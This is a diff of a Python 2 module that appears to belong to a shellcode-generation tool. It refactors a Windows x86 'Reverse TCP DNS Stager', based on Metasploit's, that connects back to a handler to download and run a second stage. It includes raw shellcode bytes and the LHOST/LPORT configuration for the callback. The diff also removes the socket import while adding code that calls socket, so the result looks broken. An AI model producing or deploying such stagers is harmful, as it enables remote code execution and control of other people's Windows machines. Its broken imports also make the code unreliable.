@@ -3,15 +3,15 @@
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/windows/reverse_tcp_dns.rb
 
 import binascii
-import socket
 
 
-class RevTCPDNS:
+class PayloadModule:
 
-    def __init__(self):
+    def __init__(self, cli_arguments):
         self.name = "Reverse TCP DNS Stager (Stage 1)"
         self.description = "Resolves DNS address, connects back to a handler\
         to download and run fun files :)"
+        self.cli_name = "rev_tcp_dns"
         self.platform = "Windows"
         self.arch = "x86"
         self.lport = 4444
@@ -44,11 +44,6 @@ class RevTCPDNS:
             "\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A" +
             "\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68" +
             "\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3")
-
-    def set_attrs(self, lport_value, lhost_value):
-        self.lport = lport_value
-        self.lhost = lhost_value
-        return
 
     def gen_shellcode(self):
         # Take the passed in attributes and gen shellcode
@@ -112,4 +107,20 @@ class RevTCPDNS:
         print "IP Address: " + cli_info.ip
         print "Port: " + str(cli_info.port)
         print "Shellcode Size: " + str(len(self.customized_shellcode.decode('string-escape'))) + '\n'
+        return
+
+    def set_attrs(self, lport_value, lhost_value):
+        self.lport = lport_value
+
+        # Check if given a domain or IP address:
+        if self.validate_ip(lhost_value):
+            self.lhost = lhost_value
+        else:
+            try:
+                self.lhost = socket.gethostbyname(lhost_value)
+            except socket.gaierror:
+                print "[*] Error: Invalid domain or IP provided for LHOST value!"
+                print "[*] Error: Please re-run with the correct value."
+                sys.exit()
+
         return
